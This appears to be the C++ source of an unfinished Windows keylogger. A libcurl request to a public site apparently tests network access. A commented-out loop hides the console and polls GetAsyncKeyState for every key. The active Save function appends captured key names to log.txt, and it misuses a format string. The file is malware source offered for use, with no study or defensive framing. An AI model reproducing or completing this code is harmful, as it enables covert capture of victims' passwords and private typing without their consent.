 
#include <stdio.h>
#include <cwchar>
#include <curl.h>
// #include <algorithm>
// #include <cstdlib>
// #include <functional>
// #include <memory>
// #include <string>
// #include <thread>
// #include <vector>


#include <iostream>
#include <windows.h>

           // from <boost/asio/ip/tcp.hpp>
using namespace std;

int Save(int _key, char *file);

int main(int argc, char** argv){


    CURL *curl;
    CURLcode res;

    curl = curl_easy_init();

    if(curl == NULL) {
        cout<<"here";
        fprintf(stderr, "curl_easy_init() failed\n");
        return -1;
    }
    curl_easy_setopt(curl, CURLOPT_URL, "https://www.google.com");
    
    res = curl_easy_perform(curl);

    if(res != CURLE_OK) {
        fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
        return -1;
    }

    curl_easy_cleanup(curl);

    // FreeConsole();

    // char i;
    // while(true) {
    // Sleep(10);
    // for(i=8; i<=255; i++) {
    //     if(GetAsyncKeyState(i)== -32767){
    //         Save(i, "log.txt");
    //     }
    // }
    // return 0;
    // } 
    cout<<"here";
}


int Save(int _key, char *file) {
    Sleep(10);
    FILE *OUTPUT_FILE; // can also use the ofstream command
    OUTPUT_FILE = fopen(file, "a+"); //a+ is used to add new keys each time, and not overwrite
    switch(_key)
    {
        case VK_SHIFT: fprintf(OUTPUT_FILE, "[SHIFT]");
            break;
        case VK_BACK: fprintf(OUTPUT_FILE, "[BACKSPACE]");
            break;
        case VK_LBUTTON: fprintf(OUTPUT_FILE, "[LBUTTON]");
            break;
        case VK_RBUTTON: fprintf(OUTPUT_FILE, "[RBUTTON]");
            break;
        case VK_RETURN: fprintf(OUTPUT_FILE, "[ENTER]");
            break;
        case VK_TAB: fprintf(OUTPUT_FILE, "[TAB]");
            break;
        case VK_ESCAPE: fprintf(OUTPUT_FILE, "[ESCAPE]");
            break;
        case VK_CONTROL: fprintf(OUTPUT_FILE, "[Ctrl]");
            break;
        case VK_MENU: fprintf(OUTPUT_FILE, "[Alt]");
            break;
        case VK_CAPITAL: fprintf(OUTPUT_FILE, "[CAPS Lock]");
            break;
        case VK_SPACE: fprintf(OUTPUT_FILE, "[SPACE]");
            break;
    }
    fprintf(OUTPUT_FILE, "%s", &_key);
    fclose(OUTPUT_FILE);
    return 0;
}